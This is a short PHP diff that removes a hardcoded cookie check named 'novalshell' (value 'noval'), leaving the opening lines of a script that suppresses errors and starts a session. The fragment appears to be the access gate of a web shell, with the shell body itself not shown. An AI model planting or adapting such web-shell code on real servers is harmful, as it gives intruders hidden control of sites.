@@ -1,14 +1,4 @@
 <?php
-$valid_cookie_value = 'noval';
-if (!isset($_COOKIE['novalshell']) || $_COOKIE['novalshell'] !== $valid_cookie_value) {
-    echo '<script>
-            alert("Akses ditolak! Silakan Login.");
-            window.location.href = window.location.origin;
-          </script>';
-    exit();
-}
-?>
-<?php
 
 @clearstatcache();
 @session_start();
